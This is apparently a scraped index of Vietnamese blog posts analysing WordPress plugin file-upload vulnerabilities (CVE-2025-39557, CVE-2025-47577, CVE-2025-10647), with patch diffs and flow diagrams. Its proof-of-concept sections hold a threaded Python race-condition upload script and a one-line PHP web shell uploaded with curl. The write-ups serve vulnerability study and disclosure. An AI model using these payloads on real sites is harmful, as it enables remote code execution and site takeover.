B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"]\rB --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"]\rC --\u003e D[\"file_exists($file['file']) → file_get_contents($file['file'])\"]\rD --\u003e E[\"json_decode($raw) — attempt parse as JSON\"]\rE --\u003e F[\"If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()\"]\rF --\u003e G[\"Process/import template data\"]\rG --\u003e H[\"unlink($file['file']) — delete uploaded file\"]\rH --\u003e I[\"File removed from filesystem\"]\rgraph TD\rA[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"]\rB --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"]\rC --\u003e D[\"file_exists($file['file']) → file_get_contents($file['file'])\"]\rD --\u003e E[\"json_decode($raw) — attempt parse as JSON\"]\rE --\u003e F[\"If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()\"]\rF --\u003e G[\"Process/import template data\"]\rG --\u003e H[\"unlink($file['file']) — delete uploaded file\"]\rH --\u003e I[\"File removed from filesystem\"]\rgraph TD\rA[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"]\rB --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"]\rC --\u003e D[\"file_exists($file['file']) → file_get_contents($file['file'])\"]\rD --\u003e E[\"json_decode($raw) — attempt parse as JSON\"]\rE --\u003e F[\"If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()\"]\rF --\u003e G[\"Process/import template data\"]\rG --\u003e H[\"unlink($file['file']) — delete uploaded file\"]\rH --\u003e I[\"File removed from filesystem\"]\rgraph TD\rA[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"]\rB --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"]\rC --\u003e D[\"file_exists($file['file']) → file_get_contents($file['file'])\"]\rD --\u003e E[\"json_decode($raw) — attempt parse as JSON\"]\rE --\u003e F[\"If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()\"]\rF --\u003e G[\"Process/import template data\"]\rG --\u003e H[\"unlink($file['file']) — delete uploaded file\"]\rH --\u003e I[\"File removed from filesystem\"]\r","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTạo script chạy song song giữ upload và đọc import requests from concurrent.futures import ThreadPoolExecutor from datetime import datetime import threading proxies = { \"http\": \"127.0.0.1:8080\", \"https\": \"127.0.0.1:8080\" } headers = { \"User-Agent\": \"curl/8.14.1\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"Cookie\": ( \"wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7Ca49c2954010c0eed18aa2f49d261d70770dcf11a5cef221c9d43e56ed432f582; \" \"wordpress_test_cookie=WP%20Cookie%20check; \" \"wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7C514daa3c360a345b63ade229b137259ed3eed64ed9a7d2ac6679bb64774956be; \" \"mailpoet_subscriber=%7B%22subscriber_id%22%3A1%7D\" ) } php_payload = '\u003c?php phpinfo(); ?\u003e' upload_url = \"http://localhost/wp-admin/customize.php?kt-woomail-customize=1\" check_url = \"http://localhost/wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/\u003cfilename\u003e.php\" UPLOAD_THREADS = 40 CHECK_THREADS = 40 upload_success_detected = threading.Event() def upload_worker(_): session = requests.Session() session.headers.update(headers) session.verify = False files = { 'kt-woomail-import': (None, '5afa8d8781'), 'kadence-woomail-import-file': ('\u003cfilename\u003e.php', php_payload, 'application/octet-stream') } while not upload_success_detected.is_set(): try: response = session.post( upload_url, files=files, timeout=10 ) ts = datetime.now().strftime(\"%H:%M:%S\") if 200 \u003c= response.status_code \u003c 300: print(f\"\\033[92m[{ts}] [UPLOAD] Sent | 200 OK\\033[0m\") else: print(f\"\\033[93m[{ts}] [UPLOAD] Failed | {response.status_code}\\033[0m\") except Exception as e: print(f\"\\033[91m[{datetime.now().strftime('%H:%M:%S')}] [UPLOAD ERROR] {e}\\033[0m\") def check_worker(_): session = requests.Session() session.proxies.update(proxies) session.verify = False while not upload_success_detected.is_set(): try: response = session.get(check_url, timeout=8) ts = datetime.now().strftime(\"%H:%M:%S\") if response.status_code == 200 and len(response.text) \u003e 0: print(f\"\\n\\033[101m[{ts}] [RCE DETECTED!] File uploaded \u0026 executed!\\033[0m\") upload_success_detected.set() break else: print(f\"[{ts}] [CHECK] {response.status_code} | Not found yet...\") except Exception as e: print(f\"[{datetime.now().strftime('%H:%M:%S')}] [CHECK ERROR] {e}\") if __name__ == \"__main__\": print(\"\\033[96m\" + \"=\"*60) print(\" WORDPRESS KADENCE WOOMAIL UPLOAD EXPLOIT\") print(\" Upload + Auto Check Parallel Threads\") print(\"=\"*60 + \"\\033[0m\") print(f\"[*] Upload URL : {upload_url}\") print(f\"[*] Check URL : {check_url}\") print(f\"[*] Threads : {UPLOAD_THREADS} (upload) + {CHECK_THREADS} (check)\") print(\"[*] Press Ctrl+C to stop\\n\") try: with ThreadPoolExecutor(max_workers=UPLOAD_THREADS + CHECK_THREADS) as executor: upload_futures = [executor.submit(upload_worker, i) for i in range(UPLOAD_THREADS)] check_futures = [executor.submit(check_worker, i) for i in range(CHECK_THREADS)] upload_success_detected.wait() except KeyboardInterrupt: print(\"\\n\\033[93m[!] Stopped by user.\\033[0m\") finally: upload_success_detected.set() print(\"\\033[91m[!] All threads terminated.\\033[0m\") Cụ thể: Script này sẽ thực hiện việc đồng thời upload và check file đã upload, chỉ khi check được (status=200) thì mới dừng lại Chức năng check sẽ đi qua proxy của BurpSuite để quan sát dữ liệu trả về và filter dễ dàng qua status code. Lấy cookie và nonce thêm vào script Mở BurpSuite để quan sát request và response của script đi qua. Chạy script python3 -m venv venv source venv/bin/active pip install requests python script.py Trên Terminal: Kết quả trên terminal\rTrên BurpSuite: Kết quả trên BurpSuite\r","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng xảy ra do plugin bỏ qua kiểm tra MIME (test_type =\u003e false) khi upload, cho phép tải lên file .php. File bị xóa ngay sau xử lý, nhưng tồn tại ngắn đủ để khai thác qua race condition. ","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key Takeaway\rNguyên nhân: thiếu kiểm tra MIME + lưu file tạm trong thư mục public. Đã vá ở bản 1.5.15 (test_type =\u003e true). Giải pháp: luôn xác thực MIME, tránh lưu file thực thi vào thư mục public. ","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#key-takeaway"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rFile Upload via Race Condition Arbitrary File Upload WordPress Kadence WooCommerce Email Designer Plugin \u003c= 1.5.14 is vulnerable to Arbitrary File Upload ","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress TI WooCommerce Wishlist Plugin.","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rLỗ hổng “Unrestricted Upload of File with Dangerous Type” trong TemplateInvaders TI WooCommerce Wishlist cho phép tải lên Web Shell lên máy chủ web. Vấn đề này ảnh hưởng đến TI WooCommerce Wishlist: từ n/a đến before 2.10.0. CVE ID: CVE-2025-47577 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 2.9.2 Patched Versions: 2.10.0 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress TI WooCommerce Wishlist Plugin ","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - TI WooCommerce Wishlist: 2.9.2 (vulnerable) và 2.10.0 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. WooCommerce WC Fields Factory ","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rfunction tinvwl_upload_file_wc_fields_factory( $file ) { if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $upload = wp_handle_upload( $file, [ 'test_form' =\u003e false, 'test_type' =\u003e false, ] ); return $upload; } Trong phiên bản lỗi, hàm tinvwl_upload_file_wc_fields_factory() gọi đến wp_handle_upload() để upload file vào thư mục upload chính thức của WordPress (wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/) Lỗi\rTuy nhiên, tùy chọn test_type =\u003e false khiến WordPress bỏ qua việc kiểm tra MIME Type dựa trên whitelist hợp lệ. Điều này cho phép kẻ tấn công upload các tệp nguy hiểm như web shell .php lên máy chủ. function tinvwl_upload_file_wc_fields_factory( $file ) { if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $upload = wp_handle_upload( $file, [ 'test_form' =\u003e false, ] ); return $upload; } Bản vá loại bỏ tùy chọn 'test_type' =\u003e false, nên mặc định 'test_type' =\u003e true kích hoạt kiểm tra MIME theo whitelist, ngăn upload tệp nguy hiểm như web shell .php. ","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rCâu hỏi\rTrước khi tiến hành trace, tôi muốn tìm hiểu hàm wp_handle_upload(), tìm đáp án cho 2 câu hỏi: Vì sao loại bỏ 'test_type' =\u003e false lại kích hoạt kiểm tra MIME theo whitelist? Whilelist đó bao gồm những gì? wp_handle_upload() là wrapper của hàm _wp_handle_upload() function wp_handle_upload( \u0026$file, $overrides = false, $time = null ) { /* * $_POST['action'] must be set and its value must equal $overrides['action'] * or this: */ $action = 'wp_handle_upload'; if ( isset( $overrides['action'] ) ) { $action = $overrides['action']; } return _wp_handle_upload( $file, $overrides, $time, $action ); } wp_handle_upload() thiết lập $action và gọi đến _wp_handle_upload() Trong file chứa _wp_handle_upload(), dòng 915 $test_type = isset( $overrides['test_type'] ) ? $overrides['test_type'] : true; 👉 Gán giá trị cho biến $test_type - nếu trong $overrides có key 'test_type' thì dùng giá trị đó, ngược lại thì mặc định là true. Tức khi ta không truyền test_type hoặc truyền test_type =\u003e true thì $test_type là true Tại dòng 953-973 if ( $test_type ) { $wp_filetype = wp_check_filetype_and_ext( $file['tmp_name'], $file['name'], $mimes ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; // Check to see if wp_check_filetype_and_ext() determined the filename was incorrect. if ( $proper_filename ) { $file['name'] = $proper_filename; } if ( ( ! $type || ! $ext ) \u0026\u0026 ! current_user_can( 'unfiltered_upload' ) ) { return call_user_func_array( $upload_error_handler, array( \u0026$file, __( 'Sorry, you are not allowed to upload this file type.' ) ) ); } if ( ! $type ) { $type = $file['type']; } } else { $type = ''; } Nếu $test_type = true, hàm sẽ gọi wp_check_filetype_and_ext() để kiểm tra đuôi file và MIME type dựa trên danh sách hợp lệ (whitelist) của WordPress. Nếu file không có đuôi hoặc MIME type hợp lệ, và người dùng không có quyền đặc biệt (unfiltered_upload), hệ thống sẽ từ chối upload. Lines 3089-3315 function wp_check_filetype_and_ext( $file, $filename, $mimes = null ) { $proper_filename = false; // Do basic extension validation and MIME mapping. $wp_filetype = wp_check_filetype( $filename, $mimes ); ... // Validate image types. // Validate files that didn't get validated during previous checks. // The mime type must be allowed. ... } wp_check_filetype_and_ext() gọi đến wp_check_filetype() để thực hiện xác thực phần mở rộng cơ bản và ánh xạ MIME. Line 3045-3062 function wp_check_filetype( $filename, $mimes = null ) { if ( empty( $mimes ) ) { $mimes = get_allowed_mime_types(); } $type = false; $ext = false; foreach ( $mimes as $ext_preg =\u003e $mime_match ) { $ext_preg = '!\\.(' . $ext_preg . ')$!i'; if ( preg_match( $ext_preg, $filename, $ext_matches ) ) { $type = $mime_match; $ext = $ext_matches[1]; break; } } return compact( 'ext', 'type' ); } wp_check_filetype() chỉ kiểm tra đuôi file (extension) dựa trên whitelist MIME của WordPress - không xác minh nội dung thật của file Hàm gọi đến get_allowed_mime_types() để lấy danh sách MIME Types Line 3640-3661 function get_allowed_mime_types( $user = null ) { $t = wp_get_mime_types(); unset( $t['swf'], $t['exe'] ); if ( function_exists( 'current_user_can' ) ) { $unfiltered = $user ? user_can( $user, 'unfiltered_html' ) : current_user_can( 'unfiltered_html' ); } if ( empty( $unfiltered ) ) { unset( $t['htm|html'], $t['js'] ); } /** * Filters the list of allowed mime types and file extensions. * * @since 2.0.0 * * @param array $t Mime types keyed by the file extension regex corresponding to those types. * @param int|WP_User|null $user User ID, User object or null if not provided (indicates current user). */ return apply_filters( 'upload_mimes', $t, $user ); } wp_get_mime_types() được gọi sẽ trả về danh sách MIME Types thật sự được chấp nhận Line 3430-3557 function wp_get_mime_types() { /** * Filters the list of mime t","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded → add_to_wishlist()\"]\rB --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"]\rC --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"]\rD --\u003e E[\"foreach $files as $name =\u003e $file\"]\rE --\u003e F[\"if array_key_exists($name, $meta)\"]\rF --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"]\rG --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"]\rH --\u003e I[\"_wp_handle_upload() — MIME checks skipped\"]\rI --\u003e J[\"File written to /wp-content/uploads → possible RCE\"]\rgraph TD\rA[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded → add_to_wishlist()\"]\rB --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"]\rC --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"]\rD --\u003e E[\"foreach $files as $name =\u003e $file\"]\rE --\u003e F[\"if array_key_exists($name, $meta)\"]\rF --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"]\rG --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"]\rH --\u003e I[\"_wp_handle_upload() — MIME checks skipped\"]\rI --\u003e J[\"File written to /wp-content/uploads → possible RCE\"]\rgraph TD\rA[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded → add_to_wishlist()\"]\rB --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"]\rC --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"]\rD --\u003e E[\"foreach $files as $name =\u003e $file\"]\rE --\u003e F[\"if array_key_exists($name, $meta)\"]\rF --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"]\rG --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"]\rH --\u003e I[\"_wp_handle_upload() — MIME checks skipped\"]\rI --\u003e J[\"File written to /wp-content/uploads → possible RCE\"]\rgraph TD\rA[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded → add_to_wishlist()\"]\rB --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"]\rC --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"]\rD --\u003e E[\"foreach $files as $name =\u003e $file\"]\rE --\u003e F[\"if array_key_exists($name, $meta)\"]\rF --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"]\rG --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"]\rH --\u003e I[\"_wp_handle_upload() — MIME checks skipped\"]\rI --\u003e J[\"File written to /wp-content/uploads → possible RCE\"]\r","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTạo file .php chứa web shell \u003c?php system($_REQUEST[\"cmd\"]) ?\u003e Gửi POST request curl -X POST \"http://localhost\" -F \"tinv_wishlist_id=1\" -F \"product_id=1\" -F \"form[image]=1\" -F \"image=@rce.php\" RCE với file upload RCE với file upload\r","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-47577 bắt nguồn từ việc vô hiệu hóa kiểm tra MIME type (test_type =\u003e false) trong hàm wp_handle_upload(), cho phép kẻ tấn công tải lên bất kỳ tệp nào, bao gồm mã PHP độc hại. Khi file được tải lên thư mục /wp-content/uploads/, nó có thể được truy cập trực tiếp để thực thi mã từ xa (RCE). Bản vá 2.10.0 đã khắc phục bằng cách bật lại kiểm tra MIME, đảm bảo chỉ những loại file hợp lệ trong danh sách whitelist của WordPress mới được phép upload. ","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key Takeaway\rLuôn duy trì kiểm tra MIME type và phần mở rộng file khi xử lý upload. Không nên ghi đè các cơ chế bảo mật mặc định của WordPress như test_type. Khi phân tích lỗ hổng, việc so sánh patch diff giúp nhanh chóng nhận diện nguyên nhân gốc (root cause). Nhà phát triển plugin cần thường xuyên kiểm tra các hook và filter liên quan đến upload để tránh rủi ro RCE. ","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#key-takeaway"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rArbitrary File Upload WordPress TI WooCommerce Wishlist Plugin \u003c= 2.9.2 is vulnerable to Arbitrary File Upload ","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Embed PDF for WPForms Plugin.","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Embed PDF for WPForms cho WordPress bị lỗ hổng cho phép arbitrary file uploads do thiếu kiểm tra loại file trong hàm ajax_handler_download_pdf_media ở tất cả các phiên bản đến và bao gồm 1.1.5. Điều này cho phép kẻ tấn công đã xác thực, với quyền truy cập từ mức Subscriber trở lên, tải lên các file tùy ý lên server của site bị ảnh hưởng, và có thể dẫn đến remote code execution. CVE ID: CVE-2025-10647 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.1.5 Patched Versions: 1.1.6 CVSS severity: High (9.9) Required Privilege: Subscriber Product: WordPress Embed PDF for WPForms Plugin ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Embed PDF for WPForms: 1.1.5 (vulnerable) và 1.1.6 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. WPForms Plugin ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rpublic function ajax_handler_download_pdf_media() { check_ajax_referer( 'epdf_wf_download_pdf_media' ); if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); // Download the file. $tmp_file = download_url( $url ); if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( /* translators: 1. An error message. */ 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } // Move from a temp file to the uploads directory. $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); $wp_filesystem-\u003emove( $tmp_file, $path ); ... } Trong phiên bản lỗi, hàm ajax_handler_download_pdf_media() tải một file PDF từ URL được cung cấp vào Media Library của WordPress thông qua AJAX nhưng không kiểm tra loại file, không kiểm tra quyền người dùng. Lỗi\rAttacker có thể upload file .php để thực hiện RCE public function ajax_handler_download_pdf_media() { check_ajax_referer( 'epdf_wf_download_pdf_media' ); if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); if ( ! wp_check_filetype( basename( $url ) )['type'] ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } // Download the file. $tmp_file = download_url( $url ); if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( /* translators: 1. An error message. */ 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } // Move from a temp file to the uploads directory. $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); $wp_filesystem-\u003emove( $tmp_file, $path ); ... } Bản vá đã: Thực hiện kiểm tra quyền người dùng: if ( ! current_user_can( 'upload_files' ) ) { ... } Chỉ cho phép user có quyền upload mới được gọi handler. Chỉ chấp nhận một số loại file được tải lên if ( ! wp_check_filetype( basename( $url ) )['type'] ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } wp_check_filetype() thuộc WP Core trả về 2 key chính: array( 'ext' =\u003e string|false, 'type' =\u003e string|false ) Nếu type không thuộc wp_get_mime_types() thì trả về false. Mặc định chỉ chấp nhận các file không thực thi được (Không chấp nhận php). ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rHàm ajax_handler_download_pdf_media(): Check nonce chống CSRF check_ajax_referer( 'epdf_wf_download_pdf_media' ); Khi tìm kiếm với từ khóa epdf_wf_download_pdf_media trong thư mục chứa mã nguồn của plugin Nonce được tạo với key `_ajax_nonce`\rNonce được tạo có key là _ajax_nonce được lưu trữ bởi Object epdf_wf_pdf_viewer_strings =\u003e có thể lấy giá trị của _ajax_nonce trong console của trình duyệt bằng cách gọi epdf_wf_pdf_viewer_strings.nonce Lấy nonce từ console trình duyệt\rNonce này được tạo sau khi truy cập trang được tạo bằng WPForms sử dụng PDF Viewer Tạo form bằng WPForms sử dụng PDF Viewer\rForm được tạo sẽ embed vào Post/Page của WordPress Kiểm tra dữ liệu gửi lên if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } Nếu request không có url, hàm sẽ trả về JSON lỗi và dừng thực thi. Lấy và làm sạch URL $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); wp_unslash() loại bỏ slash escape (WordPress tự thêm escape khi gửi POST). esc_url_raw() làm sạch URL để đảm bảo an toàn trước khi dùng để tải file. Tải file về server (temporary) $tmp_file = download_url( $url ); download_url() tải file từ URL về file tạm thời trên server. Trả về đường dẫn tới file tạm nếu thành công, hoặc WP_Error nếu thất bại. if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } Nếu download thất bại → trả về JSON lỗi kèm thông báo lỗi. Xác định thư mục upload và tên file $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; wp_upload_dir() trả về mảng thông tin thư mục uploads: path, URL, subdir, … 